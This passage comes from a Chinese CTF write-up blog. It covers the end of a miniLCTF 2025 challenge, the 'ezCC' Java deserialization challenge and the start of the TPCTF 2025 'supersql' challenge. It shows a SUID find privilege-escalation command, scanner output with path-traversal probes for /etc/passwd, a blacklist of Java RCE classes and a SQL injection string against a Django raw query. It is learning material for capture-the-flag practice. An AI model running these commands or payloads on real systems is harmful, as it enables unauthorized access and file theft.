class="hljs-regexp">/find /u</span>sr<span class="hljs-regexp">/bin/m</span>ount <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/passwd /u</span>sr<span class="hljs-regexp">/bin/</span>su <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/chsh /u</span>sr<span class="hljs-regexp">/bin/</span>chfn <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/gpasswd /u</span>sr<span class="hljs-regexp">/bin/um</span>ount <span class="hljs-regexp">/usr/</span>bin/newgrp<br></code></pre></td></tr></table></figure><p>然后用find提权:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">find /etc/passwd -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">chmod</span> 777 /m1* \;<br><span class="hljs-built_in">cat</span> /m1* &gt;app.py<br><br>或者<br><br>find . -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">cat</span> /m1* &gt; app.py \;<br><br>等等<br></code></pre></td></tr></table></figure><p>官方wp: <a href="https://github.com/XDSEC/miniLCTF_2025/blob/main/OfficialWriteups/Web/GuessOneGuess-PyBox.md">https://github.com/XDSEC/miniLCTF_2025/blob/main/OfficialWriteups/Web/GuessOneGuess-PyBox.md</a></p><h2 id="ezCC"><a href="#ezCC" class="headerlink" title="ezCC"></a>ezCC</h2><p>看题目：</p><p><img src="http://notes.gwwafz.online/uploads/d3bd3197-bd35-41cb-ae11-26db126245a8.png"></p><p>第一次扫描失败了，然后限制了一下delay,，慢扫了一下:  </p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs llvm">[<span class="hljs-number">10</span>:<span class="hljs-number">38</span>:<span class="hljs-number">53</span>] Starting:<br>[<span class="hljs-number">10</span>:<span class="hljs-number">39</span>:<span class="hljs-number">09</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">578</span>B  - /show/<br>[<span class="hljs-number">10</span>:<span class="hljs-number">39</span>:<span class="hljs-number">22</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">17</span>MB - /secret/<br>[<span class="hljs-number">10</span>:<span class="hljs-number">39</span>:<span class="hljs-number">27</span>] <span class="hljs-number">400</span> -  <span class="hljs-number">435</span>B  - /../../../../../../../../etc/passwd<br>[<span class="hljs-number">10</span>:<span class="hljs-number">39</span>:<span class="hljs-number">27</span>] <span class="hljs-number">400</span> -  <span class="hljs-number">435</span>B  - /static/../../../../etc/passwd<br>[<span class="hljs-number">10</span>:<span class="hljs-number">39</span>:<span class="hljs-number">27</span>] <span class="hljs-number">400</span> -  <span class="hljs-number">435</span>B  - /static/../C:\windows\win.ini<br>[<span class="hljs-number">10</span>:<span class="hljs-number">39</span>:<span class="hljs-number">27</span>] <span class="hljs-number">400</span> -  <span class="hljs-number">435</span>B  - /<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F..<span class="hljs-variable">%2</span>F..<span class="hljs-variable">%2</span>F..<span class="hljs-variable">%2</span>F..<span class="hljs-variable">%2</span>F..<span class="hljs-variable">%2</span>F..<span class="hljs-variable">%2</span>F..<span class="hljs-variable">%2</span>Fetc<span class="hljs-variable">%2</span>Fpasswd<br>[<span class="hljs-number">10</span>:<span class="hljs-number">39</span>:<span class="hljs-number">59</span>] <span class="hljs-number">400</span> -  <span class="hljs-number">435</span>B  - /\..\..\..\..\..\..\..\..\..\etc\passwd<br></code></pre></td></tr></table></figure><p>这里show是显示评论的，访问secret拿到源码  </p><p>发现是.jar文件,解压发现一个pom.xml文件  </p><blockquote><p>pom.xml 是 Maven 项目的核心配置文件  </p></blockquote><p>发现一个blacklist:</p><p><img src="http://notes.gwwafz.online/uploads/ea91ffb1-dc89-4078-b248-332e2a99ad5d.png"></p><p>还有ai的分析:  </p><p><img src="http://notes.gwwafz.online/uploads/d9342d40-1692-4083-9016-a33b038055c7.png"></p><p>上网查找一下:<br><img src="http://notes.gwwafz.online/uploads/0477f3f5-be46-43ed-8329-cd218fb7d572.png"></p><p>15年的漏洞，虽然版本对的上，但是apache有修复，感觉不像是利用点，先听ai话，反编译一下IndexController:  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> BOOT-INF.classes.com.example.controller;<br><br><span class="hljs-keyword">import</span> com.example.Components.Comment;<br><span class="hljs-keyword">import</span> com.example.tools.BlackList;<br><span class="hljs-keyword">import</span> com.example.tools.ByteArrayToStringExtractor;<br><span class="hljs-keyword">import</span> com.example.tools.Tools;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.Set;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> org.springframework.core.io.FileSystemResource;<br><span class="hljs-keyword">import</span> org.springframework.core.io.Resource;<br><span class="hljs-keyword">import</span> org.springframework.http.HttpHeaders;<br><span class="hljs-keyword">import</span> org.springframework.http.MediaType;<br><span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.PostMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br>  <span class="hljs-keyword">public</span> ArrayList&lt;Comment&gt; comments = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>  <br>  <span class="hljs-keyword">public</span> <span class="hljs-type">BlackList</span> <span class="hljs-variable">bl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BlackList</span>();<br>  <br>  Set&lt;String&gt; blacklist = <span class="hljs-built_in">this</span>.bl.blacklist;<br>  <br>  <span class="hljs-meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span><br>  <span class="hljs-meta">@ResponseBody</span><br>  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;html&gt;&lt;head&gt;&lt;style&gt;body &#123; font-family: Arial, sans-serif; background-color: #f0f0f0; padding: 20px; &#125;.container &#123; max-width: 600px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); &#125;h1 &#123; color: #333; &#125;form &#123; margin-top: 20px; &#125;label &#123; display: block; margin-bottom: 8px; &#125;input[type=&#x27;text&#x27;] &#123; width: 100%; padding: 8px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px; &#125;input[type=&#x27;submit&#x27;] &#123; background-color: #4CAF50; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; &#125;input[type=&#x27;submit&#x27;]:hover &#123; background-color: #45a049; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&#x27;container&#x27;&gt;&lt;h1&gt;Welcome to miniLCTF 2025~&lt;/h1&gt;&lt;p&gt;Do you really know the CC?&lt;/p&gt;&lt;form action=&#x27;/handle&#x27; method=&#x27;post&#x27;&gt;  &lt;label for=&#x27;data&#x27;&gt;Enter data:&lt;/label&gt;  &lt;input type=&#x27;text&#x27; id=&#x27;data&#x27; name=&#x27;data&#x27;&gt;  &lt;input type=&#x27;submit&#x27; value=&#x27;Submit&#x27;&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>;<br>  &#125;<br>  <br>  <span class="hljs-meta">@PostMapping(&#123;&quot;/handle&quot;&#125;)</span><br>  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">ser</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Comment</span> <span class="hljs-variable">new_comment</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Comment</span>(data);<br>    <span class="hljs-type">byte</span>[] comments_code = Tools.serialize(new_comment);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">comments_str</span> <span class="hljs-operator">=</span> Tools.base64Encode(comments_code);<br>    deser(comments_str);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:/show&quot;</span>;<br>  &#125;<br>  <br>  <span class="hljs-meta">@RequestMapping(&#123;&quot;/deserialize&quot;&#125;)</span><br>  <span class="hljs-meta">@ResponseBody</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deser</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">if</span> (data.length() &gt; <span class="hljs-number">6000</span>)<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;Payload too long&quot;</span>); <br>    <span class="hljs-type">byte</span>[] comments_code = Tools.base64Decode(data);<br>    List&lt;String&gt; result = ByteArrayToStringExtractor.extractVisibleStrings(comments_code);<br>    <span class="hljs-keyword">for</span> (String i : <span class="hljs-built_in">this</span>.blacklist) &#123;<br>      <span class="hljs-keyword">for</span> (String s : result) &#123;<br>        <span class="hljs-keyword">if</span> (s.contains(i))<br>          <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;Forbidden blacklist&quot;</span>); <br>      &#125; <br>    &#125; <br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-type">Comment</span> <span class="hljs-variable">trans_comment</span> <span class="hljs-operator">=</span> (Comment)Tools.deserialize(comments_code);<br>      <span class="hljs-built_in">this</span>.comments.add(trans_comment);<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>      e.printStackTrace();<br>    &#125; <br>  &#125;<br>  <br>  <span class="hljs-meta">@RequestMapping(&#123;&quot;/show&quot;&#125;)</span><br>  <span class="hljs-meta">@ResponseBody</span><br>  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">show</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">htmlBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>    htmlBuilder.append(<span class="hljs-string">&quot;&lt;html&gt;&lt;head&gt;&lt;style&gt;&quot;</span>)<br>      .append(<span class="hljs-string">&quot;body &#123; font-family: Arial, sans-serif; background-color: #f0f0f0; padding: 20px; &#125;&quot;</span>)<br>      .append(<span class="hljs-string">&quot;.container &#123; max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); &#125;&quot;</span>)<br>      .append(<span class="hljs-string">&quot;h1 &#123; color: #333; &#125;&quot;</span>)<br>      .append(<span class="hljs-string">&quot;ul &#123; list-style-type: none; padding: 0; &#125;&quot;</span>)<br>      .append(<span class="hljs-string">&quot;li &#123; margin-bottom: 10px; padding: 10px; background-color: #f9f9f9; border-radius: 4px; &#125;&quot;</span>)<br>      .append(<span class="hljs-string">&quot;.comment-text &#123; font-weight: bold; &#125;&quot;</span>)<br>      .append(<span class="hljs-string">&quot;.comment-time &#123; color: #666; font-size: 0.9em; &#125;&quot;</span>)<br>      .append(<span class="hljs-string">&quot;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&quot;</span>)<br>      .append(<span class="hljs-string">&quot;&lt;div class=&#x27;container&#x27;&gt;&quot;</span>)<br>      .append(<span class="hljs-string">&quot;&lt;h1&gt;Comments&lt;/h1&gt;&quot;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.comments.isEmpty()) &#123;<br>      htmlBuilder.append(<span class="hljs-string">&quot;&lt;p&gt;No comments yet.&lt;/p&gt;&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      htmlBuilder.append(<span class="hljs-string">&quot;&lt;ul&gt;&quot;</span>);<br>      <span class="hljs-keyword">for</span> (Comment comment : <span class="hljs-built_in">this</span>.comments)<br>        htmlBuilder.append(<span class="hljs-string">&quot;&lt;li&gt;&quot;</span>)<br>          .append(<span class="hljs-string">&quot;&lt;span class=&#x27;comment-text&#x27;&gt;&quot;</span>).append(comment.getText()).append(<span class="hljs-string">&quot;&lt;/span&gt;&quot;</span>)<br>          .append(<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>)<br>          .append(<span class="hljs-string">&quot;&lt;span class=&#x27;comment-time&#x27;&gt;From: &quot;</span>).append(comment.getFormattedTimestamp()).append(<span class="hljs-string">&quot;&lt;/span&gt;&quot;</span>)<br>          .append(<span class="hljs-string">&quot;&lt;/li&gt;&quot;</span>); <br>      htmlBuilder.append(<span class="hljs-string">&quot;&lt;/ul&gt;&quot;</span>);<br>    &#125; <br>    htmlBuilder.append(<span class="hljs-string">&quot;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>);<br>    <span class="hljs-keyword">return</span> htmlBuilder.toString();<br>  &#125;<br>  <br>  <span class="hljs-meta">@RequestMapping(&#123;&quot;/secret&quot;&#125;)</span><br>  <span class="hljs-meta">@ResponseBody</span><br>  <span class="hljs-keyword">public</span> ResponseEntity&lt;Resource&gt; <span class="hljs-title function_">secret</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/app/final.jar&quot;</span>;<br>    <span class="hljs-type">FileSystemResource</span> <span class="hljs-variable">fileSystemResource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileSystemResource</span>(path);<br>    <span class="hljs-keyword">if</span> (!fileSystemResource.exists() || !fileSystemResource.isReadable())<br>      <span class="hljs-keyword">return</span> ResponseEntity.notFound().build(); <br>    <span class="hljs-type">HttpHeaders</span> <span class="hljs-variable">headers</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpHeaders</span>();<br>    headers.add(<span class="hljs-string">&quot;Content-Disposition&quot;</span>, <span class="hljs-string">&quot;attachment; filename=\&quot;&quot;</span> + fileSystemResource.getFilename() + <span class="hljs-string">&quot;\&quot;&quot;</span>);<br>    <span class="hljs-keyword">return</span> ((ResponseEntity.BodyBuilder)ResponseEntity.ok().headers(headers)).contentLength(fileSystemResource.contentLength()).contentType(MediaType.APPLICATION_OCTET_STREAM).body(fileSystemResource);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>应该类似是路由，其中有handle和show，deserialize<br>&#x2F;handle 应该是用来上传comment的<br>&#x2F;show 是显示评论<br>&#x2F;deserialize 应该就是反序列化了  </p><p>网上关于ctf的cc好是反序列化  </p><p>那先看看&#x2F;handle：   </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">@<span class="hljs-title class_">PostMapping</span>(&#123;<span class="hljs-string">&quot;/handle&quot;</span>&#125;)<br>public <span class="hljs-title class_">String</span> <span class="hljs-title function_">ser</span>(<span class="hljs-title class_">String</span> data) throws <span class="hljs-title class_">Exception</span> &#123;<br>  <span class="hljs-title class_">Comment</span> new_comment = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Comment</span>(data);<br>  byte[] comments_code = <span class="hljs-title class_">Tools</span>.<span class="hljs-title function_">serialize</span>(new_comment);<br>  <span class="hljs-title class_">String</span> comments_str = <span class="hljs-title class_">Tools</span>.<span class="hljs-title function_">base64Encode</span>(comments_code);<br>  <span class="hljs-title function_">deser</span>(comments_str);<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:/show&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后的用户传入会经过base64解码后传入反序列化的函数，就是下面的&#x2F;deserialize  </p><p>那关键点可能就在&#x2F;deserialize  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deser</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>  <span class="hljs-keyword">if</span> (data.length() &gt; <span class="hljs-number">6000</span>) <span class="hljs-comment">//有长度限制,注意是 Base64 字符串长度，不是原始字节长度</span><br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;Payload too long&quot;</span>); <br>  <span class="hljs-type">byte</span>[] comments_code = Tools.base64Decode(data);<br>  List&lt;String&gt; result = ByteArrayToStringExtractor.extractVisibleStrings(comments_code);<br>  <span class="hljs-keyword">for</span> (String i : <span class="hljs-built_in">this</span>.blacklist) &#123;<br>    <span class="hljs-keyword">for</span> (String s : result) &#123;<br>      <span class="hljs-keyword">if</span> (s.contains(i))<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;Forbidden blacklist&quot;</span>); <br>    &#125; <br>  &#125; <br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">Comment</span> <span class="hljs-variable">trans_comment</span> <span class="hljs-operator">=</span> (Comment)Tools.deserialize(comments_code);<br>    <span class="hljs-built_in">this</span>.comments.add(trans_comment); <span class="hljs-comment">//评论是根据反序列化后的payload构建</span><br>  &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>    e.printStackTrace();<br>  &#125; <br>&#125;<br></code></pre></td></tr></table></figure><p>需要看一眼blacklist:   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> BOOT-INF.classes.com.example.tools;<br><br><span class="hljs-keyword">import</span> java.util.Arrays;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Set;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BlackList</span> &#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> Set&lt;String&gt; blacklist;<br>  <br>  <span class="hljs-keyword">public</span> <span class="hljs-title function_">BlackList</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">this</span>.blacklist = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();<br>    <span class="hljs-built_in">this</span>.blacklist.addAll(Arrays.asList(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; <span class="hljs-string">&quot;Runtime&quot;</span>, <span class="hljs-string">&quot;ScriptEngine&quot;</span>, <span class="hljs-string">&quot;SpelExpressionParser&quot;</span>, <span class="hljs-string">&quot;ProcessImpl&quot;</span>, <span class="hljs-string">&quot;UNIXProcess&quot;</span>, <span class="hljs-string">&quot;forkAndExec&quot;</span>, <span class="hljs-string">&quot;ProcessBuilder&quot;</span>, <span class="hljs-string">&quot;UnixPrint&quot;</span> &#125;)); <span class="hljs-comment">//过滤了这些关键词，虽然不知道作用是什么</span><br>  &#125;<br>  <br>  <span class="hljs-keyword">public</span> <span class="hljs-title function_">BlackList</span><span class="hljs-params">(<span class="hljs-type">int</span> sign)</span> &#123;<br>    <span class="hljs-built_in">this</span>.blacklist = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">com</span>.example.tools.BlackList()).blacklist;<br>    <span class="hljs-built_in">this</span>.blacklist.addAll(Arrays.asList(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; <span class="hljs-string">&quot;jackson&quot;</span>, <span class="hljs-string">&quot;ChainedTransformer&quot;</span> &#125;));<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>那我的思路可能就是通过反序列话来实现rce，根据题目提示应该是这样，不去考虑xss这边。<br>给ai分析了项目，说是blacklist过滤很弱，可以尝试cc1链  </p><p>搞来搞去，还是搞不懂java这块，以后再学吧  </p><p><a href="https://xz.aliyun.com/news/12115">https://xz.aliyun.com/news/12115</a>  </p>]]></content>
    
    
    
    <tags>
      
      <tag>刷题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TPCTF 2025 尝试复现</title>
    <link href="/2025/10/20/TPCTF2025/"/>
    <url>/2025/10/20/TPCTF2025/</url>
    
    <content type="html"><![CDATA[<h1 id="TPCTF-2025-尝试复现"><a href="#TPCTF-2025-尝试复现" class="headerlink" title="TPCTF 2025 尝试复现"></a>TPCTF 2025 尝试复现</h1><h2 id="supersql"><a href="#supersql" class="headerlink" title="supersql"></a>supersql</h2><p>考点：django 的post 表单处理，quine注入</p><p>拿到题目是在一个“Welcome to TPCTF 2025”的页面里。  </p><p>dirsearch扫了一下，flag定位到&#x2F;了  </p><p>只能去翻源码了，看看路由在哪  </p><p>然后在view看到：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> django.shortcuts <span class="hljs-keyword">import</span> render<br><span class="hljs-keyword">from</span> django.db <span class="hljs-keyword">import</span> connection<br><br><span class="hljs-comment"># Create your views here.</span><br><span class="hljs-keyword">from</span> django.http <span class="hljs-keyword">import</span> HttpResponse,HttpRequest<br><span class="hljs-keyword">from</span> .models <span class="hljs-keyword">import</span> AdminUser,Blog<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">request:HttpRequest</span>):<br>    <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&#x27;Welcome to TPCTF 2025&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>(<span class="hljs-params">request:HttpRequest</span>):<br>    <span class="hljs-keyword">if</span> request.method != <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&#x27;Welcome to TPCTF 2025&#x27;</span>)<br>    username = request.POST.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>    <span class="hljs-keyword">if</span> username != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&#x27;you are not admin.&#x27;</span>)<br>    password = request.POST.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br>    users:AdminUser = AdminUser.objects.raw(<span class="hljs-string">&quot;SELECT * FROM blog_adminuser WHERE username=&#x27;%s&#x27; and password =&#x27;%s&#x27;&quot;</span> % (username,password))<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">assert</span> password == users[<span class="hljs-number">0</span>].password<br>        <span class="hljs-keyword">return</span> HttpResponse(os.environ.get(<span class="hljs-string">&#x27;FLAG&#x27;</span>))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&#x27;wrong password&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>看到在flag页面有post参数  </p><p>故尝试传入：<br>username&#x3D;admin’or(1&#x3D;1)#&amp;password&#x3D;password</p><p>被拦截了：<br>Malicious request detected</p><p>看来虽然是直接拼接，但是是有waf的<br>又尝试去翻源码，看到有waf  </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 